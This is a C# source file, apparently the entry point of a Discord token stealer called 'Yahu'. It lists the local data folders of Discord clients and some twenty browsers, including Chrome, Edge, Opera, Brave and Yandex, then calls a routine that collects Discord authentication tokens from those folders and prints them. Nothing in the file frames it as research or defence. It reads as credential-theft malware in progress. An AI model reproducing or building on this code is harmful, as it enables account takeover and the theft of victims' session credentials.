using System.Diagnostics;
using Yahu.features;

namespace Yahu;

class Program
{
    static void Main(string[] args)
    {
        var discordTokens = Discord.GetDiscordTokens(ConstantPaths.DISCORD_PATHS);
        if (!discordTokens.Any())
            Console.WriteLine("No discord tokens found.");
        
        Console.WriteLine(discordTokens.Count);
        foreach (var discordToken in discordTokens)
        {
            Console.WriteLine(discordToken);
        }

    }
}

public class ConstantPaths
{
    public static string LOCAL = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
    public static string ROAMING = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    
    public static readonly Dictionary<string, string> DISCORD_PATHS = new Dictionary<string, string>
    {
        ["Discord"] = Path.Combine(ROAMING, "discord"),
        ["Discord Canary"] = Path.Combine(ROAMING, "discordcanary"),
        ["Lightcord"] = Path.Combine(ROAMING, "Lightcord"),
        ["Discord PTB"] = Path.Combine(ROAMING, "discordptb"),
        ["Opera"] = Path.Combine(ROAMING, "Opera Software", "Opera Stable"),
        ["Opera GX"] = Path.Combine(ROAMING, "Opera Software", "Opera GX Stable"),
        ["Amigo"] = Path.Combine(LOCAL, "Amigo", "User Data"),
        ["Torch"] = Path.Combine(LOCAL, "Torch", "User Data"),
        ["Kometa"] = Path.Combine(LOCAL, "Kometa", "User Data"),
        ["Orbitum"] = Path.Combine(LOCAL, "Orbitum", "User Data"),
        ["CentBrowser"] = Path.Combine(LOCAL, "CentBrowser", "User Data"),
        ["7Star"] = Path.Combine(LOCAL, "7Star", "7Star", "User Data"),
        ["Sputnik"] = Path.Combine(LOCAL, "Sputnik", "Sputnik", "User Data"),
        ["Vivaldi"] = Path.Combine(LOCAL, "Vivaldi", "User Data", "Default"),
        ["Chrome SxS"] = Path.Combine(LOCAL, "Google", "Chrome SxS", "User Data"),
        ["Chrome"] = Path.Combine(LOCAL, "Google", "Chrome", "User Data", "Default"),
        ["Epic Privacy Browser"] = Path.Combine(LOCAL, "Epic Privacy Browser", "User Data"),
        ["Microsoft Edge"] = Path.Combine(LOCAL, "Microsoft", "Edge", "User Data", "Default"),
        ["Uran"] = Path.Combine(LOCAL, "uCozMedia", "Uran", "User Data", "Default"),
        ["Yandex"] = Path.Combine(LOCAL, "Yandex", "YandexBrowser", "User Data", "Default"),
        ["Brave"] = Path.Combine(LOCAL, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
        ["Iridium"] = Path.Combine(LOCAL, "Iridium", "User Data", "Default")
    };
}